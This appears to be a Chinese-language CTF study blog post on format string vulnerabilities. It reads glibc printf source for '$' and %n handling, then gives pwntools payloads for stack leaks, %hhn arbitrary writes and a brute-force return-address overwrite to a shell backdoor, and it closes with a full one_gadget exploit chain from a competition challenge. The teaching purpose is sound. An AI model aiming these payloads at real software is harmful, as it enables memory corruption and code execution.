# 格式化字符串


## overview

如今格式化字符串漏洞基本很难出现了，不过前一段时间做了几道fmt，觉得欠缺不少，总结一二


## 从源码开始


```

/* /glibc-2.42/stdio-common/printf.c */

/* Write formatted output to stdout from the format string FORMAT.  */

/* VARARGS1 */

int

__printf

(
const

char

*
format
,

...)

{


va_list

arg
;


int

done
;


va_start

(
arg
,

format
);


done

=

__vfprintf_internal

(
stdout
,

format
,

arg
,

0
);


va_end

(
arg
);


return

done
;

}

```

关键点在于11行的`__vfprintf_internal(stdout, format, arg, 0)`

- `stdout`就是标准输出的`FILE *`
- `format`是格式化字符串
- `arg`是参数列表
- `0`是一些mode flag，用于内存控制

同时介绍几个这里出现的宏函数

- `va_list`<=`__gnuc_va_list`<=`void *`，用于保存可变参数
- `va_start`得到一个指向第一个可变参数的指针，也就是“包裹的字符串后面的第一个参数“

{% notel blue 函数传参顺序 %}

函数参数入栈的顺序是\*\*从右往左，依次进栈\*\*，不过64位会先填入寄存器，然后才会将更多的参数打入栈中，例如有这样一个函数：


```

func
(
int

a1
,

int

a2
,

int

a3
,

int

a4
,
int

a5
,
int

a6
,
int

a7
,
int

a8
)

```

那么他的传参顺序如下：


```

RDI

←

a1

//
格式化字符串

RSI

←

a2

RDX

←

a3

RCX

←

a4

R8

←

a5

R9

←

a6

[
rsp
]

a8

[
rsp
+
8
]

a7

```

*入栈是`a8、a7`，加入寄存器是`RDI、RSI、RDX、RCX、R8、R9`的正序*

{% endnotel %}

接下来看printf函数的核心函数`__vfprintf_internal (stdout, format, arg, 0)`


```

/* /glibc-2.42/stdio-common/vfprintf-internal.c */

int

vfprintf

(
FILE

*
s
,

const

CHAR_T

*
format
,

va_list

ap
,

unsigned

int

mode_flags
)

{

...


if

(
!
_IO_need_lock

(
s
))


{


struct

Xprintf

(
buffer_to_file
)

wrap
;


Xprintf

(
buffer_to_file_init
)

(
&
wrap
,

s
);
//初始化缓冲区，关联到流s中


Xprintf_buffer

(
&
wrap
.
base
,

format
,

ap
,

mode_flags
);
//格式化内容写入缓冲


return

Xprintf

(
buffer_to_file_done
)

(
&
wrap
);
//将缓冲区的内容真正写到文件中


}

...


return

done
;

}

```

正如注释里，`Xprintf_buffer(&wrap.base, format, ap, mode_flags)`是将格式化字符串写入内存的函数，继续跟进下去，由于代码过长，这里只贴出和`$`有关的以及和`%n`有关的

{% folding blue::点击查看代码详细 %}


```

void

Xprintf_buffer

(
struct

Xprintf_buffer

*
buf
,

const

CHAR_T

*
format
,

va_list

ap
,

unsigned

int

mode_flags
)

{


...


/* 保存原本参数状态 */


va_list

ap_save
;


...


/* 标记只读格式的错误类型 */


enum

readonly_error_type

readonly_format

=

readonly_noerror
;


...

#ifdef COMPILE_WPRINTF


/* 查找第一个格式化说明符（宽字符版本） */


f

=

lead_str_end

=

__find_specwc

((
const

UCHAR_T

*
)

format
);

#else


/* 查找第一个格式化说明符（多字节版本） */


f

=

lead_str_end

=

__find_specmb

((
const

UCHAR_T

*
)

format
);

#endif


...


/* 如果存在注册的 printf handler，则使用慢路径 */


if

(
__glibc_unlikely

(
__printf_function_table

!=

NULL

||

__printf_modifier_table

!=

NULL

||

__printf_va_arg_table

!=

NULL
))


goto

do_positional
;


...


do


{


...


/* 从参数中获取宽度 */


LABEL

(
width_asterics
)
:


{


const

UCHAR_T

*
tmp
;

/* 临时指针 */


tmp

=

++
f
;


if

(
ISDIGIT

(
*
tmp
))


{


int

pos

=

read_int

(
&
tmp
);


...


if

(
pos

&&

*
tmp

==

L_
(
'$'
))


/* 宽度来自位置参数 */


goto

do_positional
;


}


width

=

va_arg

(
ap
,

int
);


...


}


JUMP

(
*
f
,

step1_jumps
);


/* 格式字符串中直接给定宽度 */


LABEL

(
width
)
:


width

=

read_int

(
&
f
);


...


if

(
*
f

==

L_
(
'$'
))


/* 哦豁，宽度来自位置参数 */


goto

do_positional
;


JUMP

(
*
f
,

step1_jumps
);


LABEL

(
precision
)
:


++
f
;


if

(
*
f

==

L_
(
'*'
))


{


const

UCHAR_T

*
tmp
;

/* 临时指针 */


tmp

=

++
f
;


if

(
ISDIGIT

(
*
tmp
))


{


int

pos

=

read_int

(
&
tmp
);


...


if

(
pos

&&

*
tmp

==

L_
(
'$'
))


/* 精度来自位置参数 */


goto

do_positional
;


}


prec

=

va_arg

(
ap
,

int
);


...


}


else

if

(
ISDIGIT

(
*
f
))


{


prec

=

read_int

(
&
f
);


...


}


else


/* 精度缺省时置 0 */


prec

=

0
;


JUMP

(
*
f
,

step2_jumps
);


...


/* 处理当前格式说明符 */


while

(
1
)


{

#define process_arg_int()                    va_arg (ap, int)

#define process_arg_long_int()               va_arg (ap, long int)

#define process_arg_long_long_int()          va_arg (ap, long long int)

#define process_arg_pointer()                va_arg (ap, void *)

#define process_arg_string()                 va_arg (ap, const char *)

#define process_arg_unsigned_int()           va_arg (ap, unsigned int)

#define process_arg_unsigned_long_int()      va_arg (ap, unsigned long int)

#define process_arg_unsigned_long_long_int() va_arg (ap, unsigned long long int)

#define process_arg_wchar_t()                va_arg (ap, wchar_t)

#define process_arg_wstring()                va_arg (ap, const wchar_t *)

#include

"vfprintf-process-arg.c"

#undef process_arg_int

#undef process_arg_long_int

#undef process_arg_long_long_int

#undef process_arg_pointer

#undef process_arg_string

#undef process_arg_unsigned_int

#undef process_arg_unsigned_long_int

#undef process_arg_unsigned_long_long_int

#undef process_arg_wchar_t

#undef process_arg_wstring


...


/* 未知或复杂情况 → 回退（包括位置参数情况） */


LABEL

(
form_unknown
)
:


if

(
spec

==

L_
(
'\0'
))


{

...

}


goto

do_positional
;


}


...


}


while

(
*
f

!=

L_
(
'\0'
)

&&

!
Xprintf_buffer_has_failed

(
buf
));


return
;


/* 交给位置参数处理函数 */

do_positional
:


printf_positional

(
buf
,

format
,

readonly_format
,

ap
,

&
ap_save
,


nspecs_done
,

lead_str_end
,

work_buffer
,


save_errno
,

grouping
,

thousands_sep
,

mode_flags
);

}

```

{% endfolding %}

**总而言之**：`$` 会强制 `printf` 切到“位置参数慢路径”：先对格式串做一遍彻底解析，把所有会用到的参数（包括宽度/精度的 `*`）按编号从 `va_list` 抓出来放进“参数值表”，再用第二遍按编号从这张“快照表”里取值进行输出

`%n`相关:


```

/* === %n handler（等价重述版）=== */

LABEL
(
form_number
)
:

{


/* 1) 可选的 Fortify 检查：若启用 PRINTF_FORTIFY，会校验格式串所在区域是否只读。

     失败则直接致命报错（__libc_fatal("*** %n in writable segment detected ***\n")）。 */


if

((
mode_flags

&

PRINTF_FORTIFY
)

!=

0
)

{


if

(
!
readonly_format
)

{


extern

int

__readonly_area

(
const

void

*
,

size_t
);


readonly_format

=

__readonly_area
(
format
,

(
STR_LEN
(
format
)

+

1
)

*

sizeof
(
CHAR_T
));


}


if

(
readonly_format

<

0
)


__libc_fatal
(
"*** %n in writable segment detected ***
\n
"
);


}


/* 2) 取出 %n 对应的“指针参数”。在快速路径是 va_arg(ap, void*)，

        在位置参数慢路径是从 args_value[...] 取出。*/


void

*
dst

=

process_arg_pointer
();


/* 3) 按长度修饰符写回“当前已输出字符数” done：

        ll  -> long long*

        l   -> long*

        hh  -> signed char*

        h   -> short*

        默认 -> int*

  */


if

(
is_longlong
)

*
(
long

long

*
)
dst

=

done
;


else

if

(
is_long_num
)

*
(
long

*
)
dst

=

done
;


else

if

(
is_char
)

*
(
signed

char

*
)
dst
=

done
;


else

if

(
!
is_short
)

*
(
int

*
)
dst

=

done
;


else

*
(
short

*
)
dst

=

done
;


break
;

}

```

**总而言之**：`%n` 会把已输出字符数写入用户传入的整型指针（类型由修饰符决定），在\*\*位置参数模式($)下地址固定不可再改，且现代 glibc 会通过 Fortify 检查限制其滥用。\*\*


## 攻击方式

> 如今只考察fmt的题目真的很少见了


### **栈上的fmt**


```

#include

<stdio.h>

int

main
()

{


char

s
[
100
];


int

a

=

1
,

b

=

0x22222222
,

c

=

-1
;


scanf
(
"%s"
,

s
);


printf
(
s
);


return

0
;

}

```

编译：`gcc -fno-stack-protector -no-pie -o pwn pwn.c`

gdb调试：

![image-20250910180311035]](../images/image-20250910180311035.png)


#### **栈上的泄露**

这里我想要泄露返回地址，从而泄露`libc`，可以计算偏移如下：

我们输入的格式化字符串位于rdi中，接下来的解析位置依次为`RSI、RDX、RCX、R8、R9`，然后是`rsp`、`rsp+8`...；

那么RSI相对的偏移就是1，RDX为2等等，依次类推，因此我们想要泄露`__libc_start_call_main+122`的地址，可计算偏移$offset=5+1+19=25$

验证下：

![image-20250910180458340]](../images/image-20250910180458340.png)

**符合预期**


#### 栈上的任意写

控制好偏移，随便写，这里借用一个[师傅](https://www.cnblogs.com/lemon629/p/14026405.html)的演示代码


```

#include

<stdio.h>

#include

<stdlib.h>

#include

<string.h>

#include

<unistd.h>

long

long

target

=

0x1234
;

int

main
()

{


char

s
[
100
];


while
(
1
)


{


read
(
0
,
s
,
0x100
);


printf
(
s
);


if
(
target

==

0x7ffff7ff7123
)


{


puts
(
"ohhhhhh,you change it to be a big number!"
);


break
;


}


if
(
target

==

0x2
)


{


puts
(
"ohhhhhh,you change it to be a small number!"
);


break
;


}


else


{


puts
(
"you are not a pwner!!!"
);


}


}


puts
(
"this is flag: flag{F0rMat_5tr1ng_BY_64_b1T!!!!}"
);


return

0
;

}

```

编译`gcc -fno-stack-protector -no-pie -o pwn pwn.c`

**大数字写**

只要知道我们要写的地址，那么指定位置就好了


```

payload

=

b
"
%35c
%8$hhn"
.
ljust
(
0x10
,
b
'a'
)

+

p64
(
target
)
//
23

p
.
send
(
payload
)

payload

=

b
"
%113c
%8$hhn"
.
ljust
(
0x10
,
b
'a'
)

+

p64
(
target

+

1
)
//
71

p
.
send
(
payload
)

payload

=

b
"
%255c
%8$hhn"
.
ljust
(
0x10
,
b
'a'
)

+

p64
(
target

+

2
)
//
ff

p
.
send
(
payload
)

payload

=

b
"
%247c
%8$hhn"
.
ljust
(
0x10
,
b
'a'
)

+

p64
(
target

+

3
)
//
f7

p
.
send
(
payload
)

payload

=

b
"
%255c
%8$hhn"
.
ljust
(
0x10
,
b
'a'
)

+

p64
(
target

+

4
)
//
ff

p
.
send
(
payload
)

payload

=

b
"
%127c
%8$hhn"
.
ljust
(
0x10
,
b
'a'
)

+

p64
(
target

+

5
)
//
7
f

p
.
send
(
payload
)

```

原本这里的偏移是6，不过由于我们补齐了0x10，所以将地址挤到了8偏移处

不过一般题目不会出现循环输入，尝试一次输入


```

//
offset

=

6
+
0x50
/
8

=

16

payload

=
b
"
%35c
%16$hhn"

//
35
=
0x23

payload
+=
b
"
%78c
%17$hhn"

//
35
+
78
=
0x71

payload
+=
b
"
%142c
%18$hhn"

//
0x71
+
142
=
0xff

payload
+=
b
"
%248c
%19$hhn"

//
(
0xff
+
248
)
%
256
=
0xf7

payload
+=
b
"
%8c
%20$hhn"

//
(
0xff
+
248
+
8
)
%
256
=
0xff

payload
+=
"
%128c
%21$hhn"

//
(
0xff
+
248
+
8
+
128
)
%
256
=
0x7f

payload

=

payload
.
ljust
(
0x50
,
'a'
)

payload

+=
flat
(


p64
(
target
),


p64
(
target

+

1
),


p64
(
target

+

2
),


p64
(
target

+

3
),


p64
(
target

+

4
),


p64
(
target

+

5
)

)

p
.
send
(
payload
)

```

**小数字写**

大数字写都会了，小数字就把高位写成0就好了


### 栈上的fmt

挺极限的，啥也没有，一次机会的栈上fmt，静态编译


```

int

__fastcall

main
(
int

argc
,

const

char

**
argv
,

const

char

**
envp
)

{


int

v3
;

// edx


int

v4
;

// ecx


int

v5
;

// r8d


int

v6
;

// r9d


char

v8
[
104
];

// [rsp+0h] [rbp-70h] BYREF


unsigned

__int64

v9
;

// [rsp+68h] [rbp-8h]


v9

=

__readfsqword
(
0x28u
);


init_0
(
argc
,

argv
,

envp
);


puts
(
"one printf"
);


read
(
0L
L
,

v8
,

0x60LL
);


printf
((
unsigned

int
)
v8
,

(
unsigned

int
)
v8
,

v3
,

v4
,

v5
,

v6
,

v8
[
0
]);


return

0
;

}

__int64

back_door
()

{


return

system
((
__int64
)
"/bin/sh"
);

}

```

`pinrtf`的栈帧，栈上我们输入可以到达的地方有个栈地址
![Pasted image 20251013202640.png](../../images/Pasted%20image%2020251013202640.png)
也就是这里


```

09
:
004
8
│
-030

0x7fffffffd950

—▸

0x7fffffffdaa8

—▸

0x7fffffffddbf

◂—

'
/
home
/
pwn
/
games
/
printf
/
pwn_patched
'

```

存放的栈地址是 `0x7fffffffdaa8`，`main`的返回地址是`0x7fffffffd988`，有两字节不同，爆破并修改返回地址为后门函数


```

def

bomb
():


p
.
recvuntil
(
b
'one printf'
)


payload

=

'%
{}
c'
.
format
(
0xbc2
)
.
encode
()
+
b
'%14$hn'


payload

=

payload
.
ljust
(
0x40
,
b
'
\x00
'
)
+
b
'
\x18\xdb
'


p
.
send
(
payload
)

while

1
:


try
:


p

=

start
()


bomb
()


p
.
sendline
(
b
'cat flag'
)


p
.
recvuntil
(
b
'{'
)


break


except
:


p
.
close
()


continue

p
.
interactive
()

```


#### plus版

非静态链接的情况下，我们可以爆破其低一字节或两字节，覆盖为返回地址的栈上地址，然后修改返回地址的低字节，回到`printf`函数之前，从而实现多次fmt


### 非栈上的fmt

> 到这篇文章的饺子醋了

\*\*第六届强网拟态线下赛\*\*的一道fmt，考察的十分极限，仅一次 `非栈上` 的格式化字符串漏洞利用机会，之后触发`_exit`退出，而我们所拥有的唯一信息就只有栈地址的末尾两个字节

ida反编译如下：


```

int

__fastcall

__noreturn

main
(
int

argc
,

const

char

**
argv
,

const

char

**
envp
)

{


__int64

savedregs
;

// [rsp+10h] [rbp+0h] BYREF


setbuf
(
stdin
,

0L
L
);


setbuf
(
stdout
,

0L
L
);


setbuf
(
stderr
,

0L
L
);


printf
(
"Gift: %x
\n
"
,

(
unsigned

__int16
)((
unsigned

__int16
)
&
savedregs

-

0xC
));


read
(
0
,

buf
,

0x100uLL
);


printf
(
buf
);


_exit
(
0
);

}

```

检查保护：


```

❯

checksec

pwn

[
*
]

'/home/pwn/pwn/litctf/fmt_fmt/pwn'


Arch:

amd64-64-little


RELRO:

Full

RELRO


Stack:

No

canary

found


NX:

NX

enabled


PIE:

PIE

enabled


SHSTK:

Enabled


IBT:

Enabled


Stripped:

No

```

这一题的打法是通过格式化字符串去编辑一个指针链，从而构造指针链以实现类ROP的效果


```

p
.
recvuntil
(
b
'Gift: '
)

value

=

int
(
p
.
recv
(
4
),
16
)

payload
=
b
'%p'
*
9

payload
+=
b
'%'
+
str
((
value
-
0xc
)
-
90
)
.
encode
()
+
b
'c%hn'

payload
+=
b
'%'
+
str
(
0x10023
-
((
value
-
0xc
)))
.
encode
()
+
b
'c%39$hhn'

payload
=
payload
.
ljust
(
0x100
,
b
'
\x00
'
)

p
.
send
(
payload
)

p
.
recvuntil
(
"0x100"
)

leak

=

int
(
p
.
recv
(
14
),
16
)

log
.
success
(
"leak:"
+
hex
(
leak
))

libc_base
=
leak
-
0x10e1f2

log
.
success
(
'libc_base:'
+
hex
(
libc_base
))

one_gadget
=
libc_base
+
0xe3b01

```

首先通过`%p`泄露一些内容，再改写偏移为11的指针链的地址，再将其指针链的结尾返回地址改为`printf`函数自身，看下面详解：

此时的寄存器值：

![image-20250910215316944]](../images/image-20250910215316944.png)

栈值：

![image-20250910215345208]](../images/image-20250910215345208.png)

按照刚刚所说的入栈顺序，我们可以预测接下来的输出为：`[RDX],[RCX],[RSI],[R8],[R9],[RSP],[RSP+8]...`

那么我们可以泄露`read+18`的地址，进而泄露libc

同时这些泄露的地址也算作输入字节，计算可知大小为90

而9个%p是为了把偏移推到第11位，也就是stack中0x05那一位，$offset=9+2=11$（在9个%后还有2个，所以挤到11位），将其指向`printf`函数的返回地址

然后改写39位（0x21)处的地址，实现`printf`函数返回地址的改写

>

```

payload
=
b
'%'
+
str
((
value
-
0xc
))
.
encode
()
+
b
'c%11$hn'

payload
+=
b
'%'
+
str
(
0x100023
-
((
value
-
0xc
)))
.
encode
()
+
b
'c%39$hhn'

payload
=
payload
.
ljust
(
0x100
,
b
'
\x00
'
)

```

>
> 这一段payload似乎与上文等效，但是从最开始的源码阅读我们可以知道，当格式化字符串处理参数的时候，如果遇到`$`，会将所有的参数保存，因此用`$`去改会用保存的参数列表去改，导致第二段不能改写

接下来的利用思路就比较简单了，正常的非栈上格式化字符串，通过多个栈链，一方面修改返回地址实现无限制`printf`，另一方面修改ogg地址，最后一次将返回地址改为ogg即可

![image-20250910221716996]](../images/image-20250910221716996.png)

> 改写`print`返回地址
>
>

```

payload
=
b
'%'
+
str
(
0x23
)
.
encode
()
+
b
'c%39$hhn'

#0x21，改返回地址

payload
+=
b
'%'
+
str
(((
value
-
4
))
-
0x23
)
.
encode
()
+
b
'c%27$hn'

#0x15，写ogg的地方

payload
=
payload
.
ljust
(
0x100
,
b
'
\x00
'
)

p
.
send
(
payload
)

```

>
> 改写`ogg`
>
>

```

payload
=
b
'%'
+
str
(
0x23
)
.
encode
()
+
b
'c%39$hhn'

#0x21，改返回地址

payload
+=
b
'%'
+
str
((
one_gadget
&
0xffff
)
-
0x23
)
.
encode
()
+
b
'c%41$hn'

#0x23，写入ogg

payload
=
payload
.
ljust
(
0x100
,
b
'
\x00
'
)

p
.
send
(
payload
)

```

>
> 改写`print`返回地址
>
>

```

payload
=
b
'%'
+
str
(
0x23
)
.
encode
()
+
b
'c%39$hhn'

#0x21，改返回地址

payload
+=
b
'%'
+
str
(((
value
-
4
+
2
))
-
0x23
)
.
encode
()
+
b
'c%27$hn'

#0x15，写ogg的地方

payload
=
payload
.
ljust
(
0x100
,
b
'
\x00
'
)

p
.
send
(
payload
)

```

>
> 改写`ogg`
>
>

```

payload
=
b
'%'
+
str
(
0x23
)
.
encode
()
+
b
'c%39$hhn'

#0x21，改返回地址

payload
+=
b
'%'
+
str
(((
one_gadget
>>
16
)
&
0xffff
)
-
0x23
)
.
encode
()
+
b
'c%41$hn'

#0x23，写入ogg

payload
=
payload
.
ljust
(
0x100
,
b
'
\x00
'
)

p
.
send
(
payload
)

```

>
> 改写`print`返回地址
>
>

```

payload
=
b
'%'
+
str
(
0x23
)
.
encode
()
+
b
'c%39$hhn'

#0x21，改返回地址

payload
+=
b
'%'
+
str
(((
value
-
4
+
2
+
2
))
-
0x23
)
.
encode
()
+
b
'c%27$hn'

#0x15，写ogg的地方

payload
=
payload
.
ljust
(
0x100
,
b
'
\x00
'
)

p
.
send
(
payload
)

```

>
> 改写`ogg`
>
>

```

payload
=
b
'%'
+
str
(
0x23
)
.
encode
()
+
b
'c%39$hhn'

#0x21，改返回地址

payload
+=
b
'%'
+
str
(((
one_gadget
>>
32
)
&
0xffff
)
-
0x23
)
.
encode
()
+
b
'c%41$hn'

#0x23，写入ogg

payload
=
payload
.
ljust
(
0x100
,
b
'
\x00
'
)

p
.
send
(
payload
)

```

最终改写返回地址，也就是把指针给挪一下


```

payload
=
b
'%'
+
str
(
0xc4
)
.
encode
()
+
b
'c%39$hhn'

payload
=
payload
.
ljust
(
0x100
,
b
'
\x00
'
)

p
.
send
(
payload
)

```


## tricks

个人觉得这样子模板不错


```

payload

=

b
'%
{}
c'
.
format
(
x
)
.
encode
()
+
b
'%k$n'

```
